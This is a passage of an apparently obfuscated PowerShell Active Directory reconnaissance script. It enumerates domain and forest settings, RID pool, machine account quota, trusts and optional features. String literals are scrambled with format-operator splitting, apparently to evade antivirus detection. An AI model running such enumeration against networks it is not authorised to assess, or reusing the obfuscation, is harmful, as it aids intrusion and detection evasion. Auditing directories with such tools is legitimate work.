                $RIDproperty = $ObjDomain.ConvertLargeIntegerToInt64($RIDManager.Properties.rIDAvailablePool.value)
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ("{3}{1}{0}{2}"-f'ws20','indo','00','W');
	            1 = ("{2}{0}{1}{3}" -f'003/Int','eri','Windows2','m');
	            2 = ("{1}{2}{0}" -f '03','W','indows20');
	            3 = ("{0}{1}{3}{2}"-f 'W','i','2008','ndows');
	            4 = ("{1}{0}{2}{3}"-f's2','Window','008','R2');
	            5 = ("{1}{0}{2}"-f 'ws','Windo','2012');
	            6 = ("{3}{0}{2}{1}"-f'ind','12R2','ows20','W');
	            7 = ("{1}{2}{0}"-f '16','Windows','20')
            }
            $DomainMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.domainFunctionality,10)] + ("{1}{2}{0}"-f 'n','Doma','i')
            Remove-Variable FLAD

            $ObjValues = @(("{0}{1}" -f 'Na','me'), $ADDomain.Name, ("{0}{2}{1}"-f 'Net','IOS','B'), $objDomain.dc.value, ("{1}{3}{0}{4}{2}"-f 'ional L','Func','l','t','eve'), $DomainMode, ("{2}{0}{1}"-f 'mainSI','D','Do'), $ADDomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'Ca','ory','teg') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Valu') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.DomainControllers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'Ca','tego','ry') -Value ("{2}{1}{0}{4}{3}" -f 'in ','ma','Do','oller','Contr')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'ue','Val') -Value $ADDomain.DomainControllers[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'ry','go','Cate') -Value ("{2}{1}{0}" -f 'Date','tion ','Crea')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'ue','Val') -Value $objDomain.whencreated.value
            $DomainObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}" -f'tego','ry','Ca') -Value ("{0}{3}{5}{4}{6}{1}{2}" -f 'ms-','u','ota','DS-Machine','ccount','A','Q')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'alue','V') -Value $objDomain.'ms-DS-MachineAccountQuota'.value
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Categ','ory') -Value ("{0}{2}{1}" -f 'RIDs ','sued','Is')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'alue','V') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'y','gor','Cate') -Value ("{2}{0}{3}{1}"-f 'Ds ','emaining','RI','R')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Val','ue') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRForest
{
<#
.SYNOPSIS
    Returns information of the current (or specified) forest.

.DESCRIPTION
    Returns information of the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{8}{9}{3}{1}{2}{7}{4}{0}{10}{11}{6}{5}"-f 'r getting Domain','or','est] Er','ADRF','o','ext','nt','r','[G','et-',' C','o')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain.Forest
        }
        Catch
        {
            Write-Verbose ("{9}{8}{3}{4}{0}{11}{6}{10}{7}{5}{1}{2}" -f ' ','ex','t','RF','orest] Error','t','re',' Con','AD','[Get-','st','getting Fo')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Remove-Variable ADDomain

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning ("{0}{1}{18}{15}{17}{12}{5}{11}{7}{19}{16}{2}{6}{13}{8}{9}{4}{14}{3}{10}"-f '[Get-A','DR','text u','r','r','g','s','res','ng S','erve','ameter','etting Fo','ror ','i',' pa','rest] ','Con','Er','Fo','t ')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }

        If ($ADForest)
        {
            # Get Tombstone Lifetime
            Try
            {
                $ADForestCNC = (Get-ADRootDSE).configurationNamingContext
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition $ADForestCNC -Properties *
                $ADForestTombstoneLifetime = $ADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning ("{6}{3}{7}{0}{5}{2}{8}{1}{4}" -f 'r ret','eti','ombst','rr','me','rieving T','[Get-ADRForest] E','o','one Lif')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity ("{1}{0}{2}{5}{4}{3}" -f 'ecy','R','cle Bin','e','atur',' Fe')
                }
                Catch
                {
                    Write-Warning ("{2}{0}{4}{3}{1}{5}{12}{7}{11}{10}{9}{6}{8}" -f 'Get-','R','[','D','A','Forest',' Re','ro','cycle Bin Feature','eving','etri','r r','] Er')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity ("{0}{4}{9}{5}{7}{3}{6}{1}{8}{2}"-f 'Priv','ent','re','anag','il','d Ac','em','cess M',' Featu','ege')
                }
                Catch
                {
                    Write-Warning ("{15}{7}{11}{9}{3}{5}{6}{14}{2}{13}{10}{0}{12}{4}{1}{8}" -f' A','ss Management Fea',' Pr','orest]','cee',' Error',' retr','-AD','ture','F','leged','R','c','ivi','ieving','[Get')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
                0 = ("{2}{0}{1}" -f'indows200','0','W');
                1 = ("{0}{4}{1}{5}{3}{6}{2}"-f 'Windo','s20','m','I','w','03/','nteri');
                2 = ("{1}{2}{3}{0}"-f 'ws2003','Win','d','o');
                3 = ("{0}{3}{2}{1}"-f 'Windows2','8','0','0');
                4 = ("{3}{0}{2}{1}"-f's20','8R2','0','Window');
                5 = ("{1}{2}{0}" -f '012','Wind','ows2');
                6 = ("{2}{3}{1}{0}" -f '2','012R','Wind','ows2');
                7 = ("{0}{2}{1}" -f'Wi','16','ndows20')
            }
            $ForestMode = $FLAD[[convert]::ToInt32($ADForest.ForestMode)] + ("{0}{1}{2}" -f'F','or','est')
            Remove-Variable FLAD

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest.ForestMode
            }

            $ObjValues = @(("{0}{1}" -f 'Na','me'), $ADForest.Name, ("{0}{1}{4}{2}{3}" -f'Funct','io','al ','Level','n'), $ForestMode, ("{3}{1}{0}{2}" -f'g Ma','amin','ster','Domain N'), $ADForest.DomainNamingMaster, ("{2}{0}{1}"-f 's','ter','Schema Ma'), $ADForest.SchemaMaster, ("{2}{0}{1}"-f 'o','tDomain','Ro'), $ADForest.RootDomain, ("{1}{2}{0}{3}" -f' Co','D','omain','unt'), $ADForest.Domains.Count, ("{2}{1}{0}{3}"-f'ou','e C','Sit','nt'), $ADForest.Sites.Count, ("{3}{2}{5}{1}{4}{0}" -f 'ount','lo',' Cat','Global','g C','a'), $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'tegory','Ca') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'lue','Va') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ry','atego','C') -Value ("{1}{2}{0}" -f 'n','Dom','ai')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'V','alue') -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}"-f'at','egory','C') -Value ("{0}{1}"-f'Si','te')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Val','ue') -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}" -f 'ry','C','atego') -Value ("{2}{1}{3}{0}"-f 'og','alC','Glob','atal')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'e','Valu') -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Cat','egory') -Value ("{4}{0}{3}{2}{1}" -f 'ne Li','me','eti','f','Tombsto')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'e','Valu') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Va','lue') -Value ("{0}{2}{3}{1}" -f 'Not','ed',' R','etriev')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f'Cat','y','egor') -Value ("{3}{4}{1}{7}{0}{2}{5}{6}" -f'w','8 ','ar','Recyc','le Bin (200','d','s)','R2 on')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'V','alue') -Value ("{2}{0}{1}"-f 'abl','ed','En')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Catego','ry') -Value ("{2}{0}{1}"-f'd',' Scope','Enable')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Valu','e') -Value $ADRecycleBin.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Va','lue') -Value ("{1}{0}"-f'ed','Disabl')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'ue','Val') -Value ("{2}{1}{0}" -f'd','sable','Di')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ory','Categ') -Value (("{1}{2}{6}{4}{7}{5}{3}{0}"-f'wards)','Priv','ileged Acc','n','em','o','ess Manag','ent (2016 '))
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'alue','V') -Value ("{1}{0}" -f'd','Enable')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ry','atego','C') -Value ("{3}{0}{1}{2}"-f 'abled ','S','cope','En')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'e','Valu') -Value $PrivilegedAccessManagement.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'ue','Val') -Value ("{0}{1}" -f'D','isabled')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Val','ue') -Value ("{1}{2}{0}" -f 'abled','D','is')
                $ForestObj += $Obj
            }
            Remove-Variable ADForest
        }
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{2}{1}"-f'Dom','in','a'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{8}{1}{6}{2}{10}{9}{4}{3}{0}{11}{5}{7}"-f 'D','et','A','ng ','ti','main Conte','-','xt','[G','r get','DRForest] Erro','o')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f 'For','est'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Remove-Variable ADDomain
            Try
            {
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ("{4}{8}{11}{9}{0}{2}{7}{1}{6}{3}{10}{5}"-f't]','tting Fores',' Error g','nte','[G','t','t Co','e','et','Fores','x','-ADR')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ForestContext

            # Get Tombstone Lifetime
            Try
            {
                $SearchPath = ("{10}{8}{4}{3}{6}{5}{2}{0}{9}{1}{7}" -f 's NT,CN=Se','ice','w','ice,C','erv','o','N=Wind','s','Directory S','rv','CN=')
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter=(("{3}{4}{1}{6}{5}{2}{0}" -f 'ice)','Directo','Serv','(na','me=',' ','ry'))
                $objSearcherResult = $objSearcherPath.FindAll()
                $ADForestTombstoneLifetime = $objSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning ("{6}{2}{10}{0}{8}{3}{5}{4}{11}{7}{12}{1}{9}" -f'st] Err','feti','Ge','re','iev','tr','[','ombston','or ','me','t-ADRFore','ing T','e Li')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    $SearchPath = ("{23}{9}{12}{26}{2}{22}{17}{1}{15}{7}{16}{14}{3}{18}{6}{20}{5}{10}{13}{8}{11}{4}{24}{25}{21}{0}{19}" -f'rvices,CN','re','F','i',',CN=Windo','ire',' Fea','=',' Servic','cycl','ct','e','e ','ory','pt',',CN','O','tu','onal','=Configuration','tures,CN=D','e','ea','CN=Re','ws NT',',CN=S','Bin ')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $ADRecycleBin = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning ("{11}{4}{12}{10}{2}{0}{7}{6}{8}{3}{9}{1}{5}"-f ' re','cy','ror','ing','RF','cle Bin Feature','rie','t','v',' Re','est] Er','[Get-AD','or')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    $SearchPath = ("{4}{8}{11}{9}{7}{15}{10}{5}{2}{6}{0}{3}{13}{20}{18}{1}{17}{19}{14}{12}{16}"-f 'N=Di',',CN=','a','rectory Service,C','CN=Pr','n','l Features,C','agem','ivil','s Man','Optio','eged Acces','N=Configu','N=','vices,C','ent Feature,CN=','ration','S','ndows NT','er','Wi')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning ("{1}{7}{0}{3}{5}{10}{4}{2}{11}{8}{6}{9}"-f 'orest] Error retr','[Get-ADR','Ac','ievi','leged ','ng Priv','a','F','nagement Fe','ture','i','cess Ma')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

            # Get Tombstone Lifetime
            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ").tombstoneLifetime.value

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            # Check Privileged Access Management Feature Status
            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ("{3}{0}{1}{2}" -f '2','0','00','Windows');
	            1 = ("{0}{2}{4}{3}{1}" -f'Windows2','rim','003/In','e','t');
	            2 = ("{2}{0}{1}" -f'0','3','Windows20');
	            3 = ("{3}{0}{2}{1}"-f 'indow','2008','s','W');
	            4 = ("{0}{2}{1}{3}"-f 'Window','20','s','08R2');
	            5 = ("{0}{1}{2}"-f'W','ind','ows2012');
	            6 = ("{2}{1}{3}{0}" -f'2','12','Windows20','R');
                7 = ("{1}{0}{3}{2}"-f 'indow','W','2016','s')
            }
            $ForestMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.forestFunctionality,10)] + ("{0}{1}{2}" -f 'F','ore','st')
            Remove-Variable FLAD

            $ObjValues = @(("{1}{0}"-f'e','Nam'), $ADForest.Name, ("{2}{1}{4}{3}{0}" -f 'l','Le','Functional ','e','v'), $ForestMode, ("{4}{1}{2}{3}{0}{5}{6}" -f'ng','o','m','ain Nami','D',' M','aster'), $ADForest.NamingRoleOwner, ("{3}{1}{0}{2}" -f'as','ema M','ter','Sch'), $ADForest.SchemaRoleOwner, ("{1}{0}{2}"-f'oo','R','tDomain'), $ADForest.RootDomain, ("{1}{3}{0}{2}" -f'in','D',' Count','oma'), $ADForest.Domains.Count, ("{2}{1}{0}" -f'unt','te Co','Si'), $ADForest.Sites.Count, ("{0}{1}{3}{2}"-f 'Global',' ','atalog Count','C'), $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f'Cat','gory','e') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Va','lue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f'ry','atego','C') -Value ("{2}{1}{0}"-f 'in','ma','Do')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'ue','Val') -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'y','C','ategor') -Value ("{1}{0}"-f'ite','S')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Valu','e') -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ategory','C') -Value ("{1}{3}{2}{0}"-f 'g','Global','alo','Cat')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ue','Val') -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}" -f 'Cat','egor','y') -Value ("{1}{0}{2}{3}{4}" -f 'o','Tombst','n','e Lif','etime')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Valu','e') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Val','ue') -Value ("{0}{2}{1}" -f'Not Ret','ieved','r')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'C','ategory') -Value ("{3}{7}{1}{6}{4}{2}{0}{5}"-f' (2008 R2 onwar','l','in','R',' B','ds)','e','ecyc')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'lue','Va') -Value ("{0}{1}{2}"-f'En','a','bled')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Catego','ry') -Value ("{1}{0}{2}" -f'nabled S','E','cope')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Va','lue') -Value $ADRecycleBin.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'V','alue') -Value ("{1}{0}" -f 'd','Disable')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Val','ue') -Value ("{0}{1}"-f 'Disab','led')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f'Ca','y','tegor') -Value ("{6}{0}{8}{4}{3}{5}{2}{1}{7}" -f'ivileg',' onwa','2016',' ','s Management','(','Pr','rds)','ed Acces')
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'lue','Va') -Value ("{1}{0}"-f'bled','Ena')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'egory','at','C') -Value ("{2}{3}{1}{0}" -f 'ope','d Sc','E','nable')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'lue','Va') -Value $PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'V','alue') -Value ("{0}{2}{1}" -f 'Disa','d','ble')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'V','alue') -Value ("{2}{0}{1}"-f 'i','sabled','D')
                $ForestObj += $Obj
            }

            Remove-Variable ADForest
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRTrust
{
<#
.SYNOPSIS
    Returns the Trusts of the current (or specified) domain.

.DESCRIPTION
    Returns the Trusts of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223768.aspx
    $TDAD = @{
        0 = ("{1}{2}{0}"-f'ed','Di','sabl');
        1 = ("{1}{2}{0}"-f 'd','Inbou','n');
        2 = ("{0}{1}"-f 'Ou','tbound');
        3 = ("{2}{0}{4}{1}{3}"-f 'i','ection','B','al','Dir');
    }

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223771.aspx
    $TTAD = @{
        1 = ("{2}{1}{0}" -f'level','n','Dow');
        2 = ("{0}{2}{1}" -f 'Upl','vel','e');
        3 = "MIT";
        4 = "DCE";
    }

    If ($Method -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
